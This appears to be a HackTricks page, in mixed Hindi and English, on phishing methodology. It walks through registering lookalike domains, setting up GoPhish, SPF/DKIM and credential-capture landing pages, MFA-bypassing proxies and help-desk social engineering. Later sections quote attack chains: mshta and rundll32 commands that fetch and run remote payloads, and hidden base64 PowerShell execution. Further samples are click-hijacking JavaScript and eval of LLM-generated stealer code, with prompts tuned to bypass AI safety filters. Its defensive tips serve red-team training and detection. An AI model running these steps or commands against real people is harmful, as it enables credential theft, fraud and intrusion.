# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. पीड़ित का Recon करें
1. **victim domain** चुनें।
2. पीड़ित द्वारा उपयोग किए गए **login portals** को **searching** करके कुछ basic web enumeration करें और **decide** करें कि किसका आप **impersonate** करेंगे।
3. **emails** **find** करने के लिए कुछ **OSINT** का उपयोग करें।
2. environment तैयार करें
1. phishing assessment के लिए उपयोग होने वाला **domain buy** करें
2. संबंधित email service records (**SPF, DMARC, DKIM, rDNS**) **configure** करें
3. VPS को **gophish** के साथ configure करें
3. campaign तैयार करें
1. **email template** तैयार करें
2. credentials चुराने के लिए **web page** तैयार करें
4. campaign launch करें!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: domain name में मूल domain का एक महत्वपूर्ण **keyword** **contains** होता है (जैसे, zelster.com-management.com).
- **hypened subdomain**: subdomain में **dot** को **hyphen** से बदलें (जैसे, www-zelster.com).
- **New TLD**: वही domain, लेकिन **new TLD** के साथ (जैसे, zelster.org)
- **Homoglyph**: यह domain name के किसी अक्षर को ऐसे **letters** से **replaces** करता है जो दिखने में मिलते-जुलते हों (जैसे, zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** यह domain name के भीतर दो अक्षरों को **swaps** करता है (जैसे, zelsetr.com).
- **Singularization/Pluralization**: domain name के अंत में “s” जोड़ता या हटाता है (जैसे, zeltsers.com).
- **Omission**: यह domain name से एक अक्षर **removes one** करता है (जैसे, zelser.com).
- **Repetition:** यह domain name के किसी एक अक्षर को **repeats one** करता है (जैसे, zeltsser.com).
- **Replacement**: Homoglyph जैसा, लेकिन कम stealthy. यह domain name के किसी एक अक्षर को बदलता है, शायद keyboard पर मूल अक्षर के पास वाले अक्षर से (जैसे, zektser.com).
- **Subdomained**: domain name के अंदर एक **dot** जोड़ें (जैसे, ze.lster.com).
- **Insertion**: यह domain name में एक अक्षर **inserts a letter** करता है (जैसे, zerltser.com).
- **Missing dot**: TLD को domain name में जोड़ दें। (जैसे, zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

एक **possibility** है कि संग्रहीत या संचार के दौरान कुछ bits विभिन्न कारणों जैसे solar flares, cosmic rays, या hardware errors के कारण automatically flipped हो जाएँ।

जब इस concept को **DNS requests** पर **applied** किया जाता है, तो संभव है कि DNS server द्वारा **received** किया गया domain, initially requested domain जैसा न हो।

उदाहरण के लिए, domain "windows.com" में single bit modification इसे "windnws.com" में बदल सकती है।

Attackers इसका **take advantage of this** करके पीड़ित के domain जैसे multiple bit-flipping domains register कर सकते हैं। उनका उद्देश्य legitimate users को अपनी infrastructure पर redirect करना है।

अधिक जानकारी के लिए पढ़ें [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

आप [https://www.expireddomains.net/](https://www.expireddomains.net) पर एक expired domain search कर सकते हैं जिसे आप use कर सकें.\
यह सुनिश्चित करने के लिए कि आप जो expired domain buy करने जा रहे हैं उसकी **already a good SEO** है, आप यह देख सकते हैं कि वह किस category में है:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

अधिक valid email addresses **discover** करने या जो आपने पहले ही **discovered** कर लिए हैं उन्हें **verify** करने के लिए आप check कर सकते हैं कि क्या आप पीड़ित के smtp servers को brute-force कर सकते हैं। [यहाँ email address verify/discover करना सीखें](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
इसके अलावा, यह न भूलें कि यदि users अपने mail access करने के लिए **any web portal** use करते हैं, तो आप check कर सकते हैं कि क्या वह **username brute force** के लिए vulnerable है, और संभव हो तो उस vulnerability को exploit करें।

## Configuring GoPhish

### Installation

आप इसे [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) से download कर सकते हैं

इसे `/opt/gophish` के अंदर download और decompress करें और `/opt/gophish/gophish` execute करें\
output में आपको port 3333 पर admin user के लिए एक password मिलेगा। इसलिए, उस port तक access करें और उन credentials का उपयोग करके admin password बदलें। आपको उस port को local पर tunnel करने की आवश्यकता हो सकती है:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### कॉन्फ़िगरेशन

**TLS certificate configuration**

इस step से पहले आपके पास **पहले से खरीदा हुआ domain** होना चाहिए जिसे आप use करने वाले हैं और वह **VPS के IP** की ओर **pointing** होना चाहिए, जहाँ आप **gophish** configure कर रहे हैं।
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail configuration**

Start installing: `apt-get install postfix`

Then add the domain to the following files:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Change also the values of the following variables inside /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Finally modify the files **`/etc/hostname`** and **`/etc/mailname`** to your domain name and **restart your VPS.**

Now, create a **DNS A record** of `mail.<domain>` pointing to the **ip address** of the VPS and a **DNS MX** record pointing to `mail.<domain>`

Now lets test to send an email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish configuration**

gophish के execution को stop करें और इसे configure करते हैं।\
`/opt/gophish/config.json` को निम्नानुसार modify करें (https के use पर ध्यान दें):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish service को configure करें**

gophish service बनाने के लिए ताकि इसे automatically शुरू किया जा सके और एक service के रूप में manage किया जा सके, आप `/etc/init.d/gophish` file को निम्न content के साथ create कर सकते हैं:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
सेवा को कॉन्फ़िगर करना पूरा करें और इसे जांचें, ये करके:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## mail server और domain कॉन्फ़िगर करना

### Wait & be legit

किसी domain की उम्र जितनी ज़्यादा होती है, उसके spam के रूप में पकड़े जाने की संभावना उतनी ही कम होती है। इसलिए phishing assessment से पहले जितना हो सके उतना समय इंतज़ार करना चाहिए (कम से कम 1week)। इसके अलावा, अगर आप reputational sector पर एक page डालते हैं, तो प्राप्त reputation बेहतर होगी।

ध्यान दें कि अगर आपको एक हफ्ता इंतज़ार करना पड़े, तब भी आप अभी सारी configuration पूरी कर सकते हैं।

### Configure Reverse DNS (rDNS) record

एक rDNS (PTR) record सेट करें जो VPS के IP address को domain name से resolve करे।

### Sender Policy Framework (SPF) Record

आपको नए domain के लिए एक SPF record **configure** करना होगा। अगर आपको नहीं पता कि SPF record क्या है, तो [**यह page पढ़ें**](../../network-services-pentesting/pentesting-smtp/index.html#spf)।

आप अपना SPF policy generate करने के लिए [https://www.spfwizard.net/](https://www.spfwizard.net) का उपयोग कर सकते हैं (VPS machine के IP का उपयोग करें)

![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)

यह वह content है जिसे domain के अंदर एक TXT record में set करना होगा:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record

आपको **नए domain के लिए DMARC record configure करना होगा**। अगर आपको नहीं पता कि DMARC record क्या है, तो [**यह पेज पढ़ें**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc)।

आपको hostname `_dmarc.<domain>` की ओर point करने वाला एक नया DNS TXT record बनाना होगा, जिसमें निम्न content हो:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

आपको नए domain के लिए **एक DKIM configure करना होगा**। अगर आपको नहीं पता कि DMARC record क्या है [**यह पेज पढ़ें**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

यह tutorial इस पर आधारित है: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> आपको DKIM key द्वारा generate किए गए दोनों B64 values को concatenate करना होगा:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### अपने email configuration score का test करें

आप यह [https://www.mail-tester.com/](https://www.mail-tester.com) का उपयोग करके कर सकते हैं\
बस page खोलें और उनके द्वारा दिए गए address पर एक email भेजें:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
आप अपनी **email configuration** भी `check-auth@verifier.port25.com` पर email भेजकर और **response पढ़कर** **check** कर सकते हैं (इसके लिए आपको port **25** **open** करना होगा और यदि आप email को root के रूप में भेजते हैं, तो response को file _/var/mail/root_ में देखना होगा)।\
जांचें कि आप सभी tests पास करते हैं:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
आप अपने नियंत्रण वाले **Gmail** पर भी **message** भेज सकते हैं, और अपने Gmail inbox में **email’s headers** जाँच सकते हैं; `Authentication-Results` header field में `dkim=pass` मौजूद होना चाहिए।
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removing from Spamhouse Blacklist

The page [www.mail-tester.com](https://www.mail-tester.com) बता सकता है कि आपका domain spamhouse द्वारा blocked है या नहीं। आप अपना domain/IP यहाँ remove कराने का request कर सकते हैं: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removing from Microsoft Blacklist

​​आप अपना domain/IP यहाँ remove कराने का request कर सकते हैं [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- sender profile की पहचान के लिए कुछ **name** set करें
- तय करें कि आप किस account से phishing emails send करने वाले हैं। Suggestions: _noreply, support, servicedesk, salesforce..._
- आप username और password blank छोड़ सकते हैं, लेकिन **Ignore Certificate Errors** को check करना न भूलें

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Everything working है या नहीं, यह test करने के लिए "**Send Test Email**" functionality का उपयोग करना recommended है.\
> मैं recommend करूंगा कि **test emails को 10min mails addresses पर send करें** ताकि testing के दौरान blacklisted होने से बचा जा सके।

### Email Template

- template की पहचान के लिए कुछ **name** set करें
- फिर एक **subject** लिखें (कुछ strange नहीं, बस ऐसा जो आप एक regular email में पढ़ने की उम्मीद कर सकते हैं)
- सुनिश्चित करें कि आपने "**Add Tracking Image**" check किया है
- **email template** लिखें (आप नीचे दिए गए example की तरह variables का उपयोग कर सकते हैं):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
ध्यान दें कि **ईमेल की विश्वसनीयता बढ़ाने के लिए**, क्लाइंट के किसी ईमेल से signature का उपयोग करने की सलाह दी जाती है। सुझाव:

- एक **non existent address** पर ईमेल भेजें और देखें कि response में कोई signature है या नहीं।
- **public emails** जैसे info@ex.com या press@ex.com या public@ex.com खोजें, उन्हें ईमेल भेजें और response का इंतज़ार करें।
- किसी **valid discovered** ईमेल से संपर्क करने की कोशिश करें और response का इंतज़ार करें

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Email Template आपको भेजने के लिए files attach करने की भी अनुमति देता है। अगर आप कुछ specially crafted files/documents का उपयोग करके NTLM challenges steal करना भी चाहते हैं, तो [यह पेज पढ़ें](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- एक **name** लिखें
- वेब पेज का **HTML code लिखें**। ध्यान दें कि आप web pages को **import** कर सकते हैं।
- **Capture Submitted Data** और **Capture Passwords** को मार्क करें
- एक **redirection** सेट करें

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> आमतौर पर आपको page के HTML code को modify करना होगा और local में कुछ tests करने होंगे (शायद किसी Apache server का उपयोग करके) **जब तक आपको results पसंद न आ जाएँ।** फिर, वही HTML code box में लिखें।\
> ध्यान दें कि अगर आपको HTML के लिए **static resources** उपयोग करने हों (शायद कुछ CSS और JS pages), तो आप उन्हें _**/opt/gophish/static/endpoint**_ में save कर सकते हैं और फिर उन्हें _**/static/\<filename>**_ से access कर सकते हैं

> [!TIP]
> redirection के लिए आप users को victim के legit main web page पर **redirect** कर सकते हैं, या उन्हें उदाहरण के लिए _/static/migration.html_ पर redirect कर सकते हैं, कुछ **spinning wheel (**[**https://loading.io/**](https://loading.io)**) 5 seconds के लिए** डाल सकते हैं और फिर बता सकते हैं कि process सफल रहा।

### Users & Groups

- एक name सेट करें
- डेटा **Import करें** (ध्यान दें कि example के लिए template उपयोग करने के लिए आपको हर user का firstname, last name और email address चाहिए)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

अंत में, एक campaign बनाएं जिसमें name, email template, landing page, URL, sending profile और group चुनें। ध्यान दें कि URL victims को भेजा जाने वाला link होगा

ध्यान दें कि **Sending Profile आपको test email भेजने की अनुमति देता है ताकि आप देख सकें कि final phishing email कैसा दिखेगा**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> मैं recommend करूंगा कि **test emails 10min mails addresses पर भेजें** ताकि tests करते समय blacklist होने से बचा जा सके।

जब सब कुछ ready हो जाए, बस campaign launch करें!

## Website Cloning

अगर किसी कारण से आप website clone करना चाहते हैं, तो following page देखें:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

कुछ phishing assessments में (mainly for Red Teams) आप ऐसे files भी **भेजना** चाहेंगे जिनमें किसी तरह का backdoor हो (शायद कोई C2 या शायद कुछ ऐसा जो authentication trigger करे)।\
कुछ examples के लिए following page देखें:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

पिछला attack काफी clever है क्योंकि आप एक real website की नकल कर रहे हैं और user द्वारा दी गई information इकट्ठा कर रहे हैं। दुर्भाग्य से, अगर user ने सही password नहीं डाला या अगर आपने जिस application को fake किया है वह 2FA के साथ configured है, तो **यह information आपको tricked user की impersonation करने नहीं देगी**।

यहीं [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) और [**muraena**](https://github.com/muraenateam/muraena) जैसे tools useful हैं। यह tool आपको MitM जैसे attack generate करने देगा। मूल रूप से, attacks निम्न तरीके से काम करते हैं:

1. आप real webpage के login form की **impersonate** करते हैं।
2. user अपने **credentials** आपकी fake page पर **send** करता है और tool उन्हें real webpage पर भेजता है, **जांचते हुए कि credentials काम करते हैं या नहीं**।
3. अगर account **2FA** के साथ configured है, तो MitM page इसे मांगेगा और user के इसे **introduce** करने के बाद tool इसे real web page पर भेज देगा।
4. user authenticated हो जाने के बाद, आप (attacker के रूप में) **captured credentials, 2FA, cookie और हर interaction की कोई भी information** रखेंगे, जबकि tool MitM कर रहा होता है।

### Via VNC

अगर **victim को original जैसी दिखने वाली malicious page** पर भेजने के बजाय आप उसे **VNC session** में भेजें जिसमें browser real web page से connected हो? आप देख पाएंगे कि वह क्या करता है, password steal कर पाएंगे, MFA used, cookies...\
आप यह [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) के साथ कर सकते हैं

## Detecting the detection

स्पष्ट रूप से, यह जानने के सबसे अच्छे तरीकों में से एक कि आप पकड़े गए हैं, अपने domain को blacklists के अंदर **search** करना है। अगर यह listed दिखता है, तो किसी तरह आपका domain suspicious के रूप में detect हुआ था।\
यह जांचने का एक आसान तरीका कि आपका domain किसी blacklist में दिख रहा है या नहीं, [https://malwareworld.com/](https://malwareworld.com) का उपयोग करना है

हालाँकि, यह जानने के अन्य तरीके भी हैं कि victim **वाइल्ड में suspicious phishing activity को actively देख रहा है** जैसा कि यहां समझाया गया है:

{{#ref}}
detecting-phising.md
{{#endref}}

आप victim के domain जैसा बहुत similar name वाला domain **buy** कर सकते हैं **और/या** अपने द्वारा नियंत्रित domain के किसी **subdomain** के लिए एक **certificate** generate कर सकते हैं, जिसमें victim के domain का **keyword** हो। अगर **victim** उनके साथ किसी भी तरह की **DNS या HTTP interaction** करता है, तो आपको पता चल जाएगा कि वह suspicious domains को actively देख रहा है और आपको बहुत stealth होना होगा।

### Evaluate the phishing

यह जांचने के लिए [**Phishious** ](https://github.com/Rices/Phishious) का उपयोग करें कि आपका email spam folder में जाएगा या blocked होगा या successful रहेगा।

## High-Touch Identity Compromise (Help-Desk MFA Reset)

आधुनिक intrusion sets increasingly email lures को पूरी तरह छोड़ देते हैं और MFA को defeat करने के लिए **सीधे service-desk / identity-recovery workflow** को target करते हैं। यह attack पूरी तरह "living-off-the-land" है: once operator के पास valid credentials होते हैं, तो वह built-in admin tooling के साथ pivot करता है – malware की आवश्यकता नहीं होती।

### Attack flow
1. Victim की recon करें
* LinkedIn, data breaches, public GitHub, आदि से personal & corporate details इकट्ठा करें।
* high-value identities (executives, IT, finance) की पहचान करें और password / MFA reset के लिए **exact help-desk process** enumerate करें।
2. Real-time social engineering
* target की impersonation करके help-desk को Phone, Teams या chat करें (अक्सर **spoofed caller-ID** या **cloned voice** के साथ)।
* knowledge-based verification पास करने के लिए पहले से collected PII दें।
* agent को **MFA secret reset** करने या registered mobile number पर **SIM-swap** करने के लिए convince करें।
3. Immediate post-access actions (≤60 min in real cases)
* किसी web SSO portal के माध्यम से foothold स्थापित करें।
* built-ins के साथ AD / AzureAD enumerate करें (कोई binaries drop नहीं की गई):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* **WMI**, **PsExec**, या environment में पहले से whitelisted legitimate **RMM** agents के साथ lateral movement करें।

### Detection & Mitigation
* help-desk identity recovery को **privileged operation** मानें – step-up auth & manager approval की आवश्यकता रखें।
* **Identity Threat Detection & Response (ITDR)** / **UEBA** rules deploy करें जो इन पर alert करें:
* MFA method changed + नए device / geo से authentication।
* उसी principal की immediate elevation (user-→-admin)।
* help-desk calls record करें और किसी भी reset से पहले पहले से registered number पर **call-back** enforce करें।
* **Just-In-Time (JIT) / Privileged Access** implement करें ताकि newly reset accounts अपने आप high-privilege tokens inherit न करें।

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews high-touch ops की लागत mass attacks से offset करते हैं जो **search engines & ad networks** को delivery channel में बदल देते हैं।

1. **SEO poisoning / malvertising** `chromium-update[.]site` जैसे fake result को top search ads तक push करता है।
2. Victim एक छोटा **first-stage loader** download करता है (अक्सर JS/HTA/ISO)। Unit 42 द्वारा देखे गए examples:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader browser cookies + credential DBs exfiltrate करता है, फिर एक **silent loader** खींचता है जो तय करता है – *in realtime* – क्या deploy करना है:
* RAT (e.g. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* नए registered domains block करें और **Advanced DNS / URL Filtering** को *search-ads* के साथ-साथ e-mail पर भी enforce करें।
* software installation को signed MSI / Store packages तक सीमित करें, policy द्वारा `HTA`, `ISO`, `VBS` execution deny करें।
* installers खोलने वाले browsers के child processes मॉनिटर करें:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* पहले-stage loaders द्वारा अक्सर abused होने वाले LOLBins की hunting करें (e.g. `regsvr32`, `curl`, `mshta`)।

### Download-button click hijacking with TDS handoff
कुछ fake software portals visible download `href` को **real** GitHub/release URL पर point करते रहते हैं, लेकिन JavaScript में **first** user interaction hijack करके victim को इसके बजाय एक **Traffic Distribution System (TDS)** chain में भेज देते हैं।
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
मुख्य विशेषताएँ:
- Hook आमतौर पर `document` पर **capture phase** (`true`) में चलता है, इसलिए यह site handlers से पहले fire होता है।
- Chrome अक्सर `click` की बजाय `mousedown` का उपयोग करता है ताकि redirect एक वैध **user gesture** से जुड़ा रहे और popup-blocker bypass बेहतर हो।
- कुछ variants पहले `about:blank` को pre-open करते हैं या `<a target="_blank">` clicks synthesize करते हैं, और बाद में TDS URL assign करते हैं।
- Browser-side caps आमतौर पर `localStorage` में होते हैं, इसलिए **first click** malware तक पहुँच सकता है जबकि refreshes/retries benign-looking visible link पर fall back हो जाते हैं।
- TDS referrer, entry domain, GEO, browser/device fingerprint, VPN/datacenter checks, click context, और per-session counters के आधार पर gate कर सकता है, जिससे analyst replays non-deterministic हो जाते हैं।

Defender ideas:
- **displayed** `href` की तुलना click time पर generated **actual** navigation target से करें।
- ऐसे `document.addEventListener(..., true)` handlers खोजें जो `window.open`, `about:blank`, या synthetic anchor clicks के आसपास `preventDefault()` और `stopImmediatePropagation()` दोनों call करते हैं।
- नए registered software-download domains के clusters को, जो सभी वही CloudFront/JS stage load करते हैं, high-signal SEO-poisoning/TDS pattern मानें।

### नकली verification pages + archive-looking LOLBAS fetches से ClickFix
कुछ TDS branches नकली verification page पर खत्म होती हैं (Cloudflare/IUAM style) जो victim को एक trusted Windows binary चलाने के लिए कहती हैं such as:
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Notes:
- `mshta.exe` **HTA/VBScript को response की शुरुआत में ही execute करता है**, भले ही URL खुद को `.7z` archive दिखाए; appended archive data सिर्फ decoy हो सकता है।
- Follow-on stages अक्सर file type के बारे में भी झूठ बोलते हैं (`.rtf` for PowerShell, `.asar` for Python, padded binaries वाले ZIPs) और फिर **manual PE mapping / in-memory execution** पर switch करते हैं।
- अगर आप इनमें से किसी chain का response कर रहे हैं, तो **first successful run** की network + memory preserve करें: बाद की replays में सिर्फ benign installer/SFX path दिख सकता है या payload/key release original TDS session से bound होने की वजह से fail हो सकता है।

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: cloned national CERT advisory with an **Update** button that displays step-by-step “fix” instructions. Victims are told to run a batch that downloads a DLL and executes it via `rundll32`.
* Typical batch chain observed:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` payload को `%TEMP%` में drop करता है, short sleep network jitter को hide करता है, फिर `rundll32` exported entrypoint (`notepad`) को call करता है।
* The DLL host identity beacon करती है और हर कुछ मिनट में C2 को poll करती है। Remote tasking **base64-encoded PowerShell** के रूप में आती है, जिसे hidden और policy bypass के साथ execute किया जाता है:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* यह C2 flexibility बनाए रखता है (server DLL को update किए बिना tasks बदल सकता है) और console windows को छिपाता है। `rundll32.exe` के PowerShell children पर `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` साथ में देखकर hunt करें।
* Defenders `...page.php?tynor=<COMPUTER>sss<USER>` जैसे HTTP(S) callbacks और DLL load के बाद 5-minute polling intervals देख सकते हैं।

---

## AI-Enhanced Phishing Operations
Attackers अब **LLM & voice-clone APIs** को chain करके fully personalised lures और real-time interaction बनाते हैं।

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, social media से inside jokes; callback scam में deep-fake CEO voice.|
|Agentic AI|Autonomously domains register करना, open-source intel scrape करना, next-stage mails craft करना जब victim click करे लेकिन creds submit न करे.|

**Defence:**
• Untrusted automation से भेजे गए messages को highlight करने के लिए **dynamic banners** जोड़ें (ARC/DKIM anomalies के जरिए)।
• High-risk phone requests के लिए **voice-biometric challenge phrases** deploy करें।
• Awareness programmes में AI-generated lures को लगातार simulate करें – static templates obsolete हैं।

See also – credential phishing के लिए agentic browsing abuse:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – secrets inventory और detection के लिए local CLI tools और MCP का AI agent abuse:

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Attackers benign-looking HTML ship कर सकते हैं और एक **trusted LLM API** से JavaScript पूछकर **runtime पर stealer generate** कर सकते हैं, फिर उसे in-browser execute कर सकते हैं (e.g., `eval` or dynamic `<script>`).

1. **Prompt-as-obfuscation:** exfil URLs/Base64 strings को prompt में encode करें; safety filters bypass करने और hallucinations कम करने के लिए wording iterate करें।
2. **Client-side API call:** load पर, JS public LLM (Gemini/DeepSeek/etc.) या CDN proxy को call करता है; static HTML में सिर्फ prompt/API call मौजूद होता है।
3. **Assemble & exec:** response को concatenate करके execute करें (polymorphic per visit):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generated code personalises the lure (e.g., LogoKit token parsing) and posts creds to the prompt-hidden endpoint.

**Evasion traits**
- Traffic hits well-known LLM domains or reputable CDN proxies; sometimes via WebSockets to a backend.
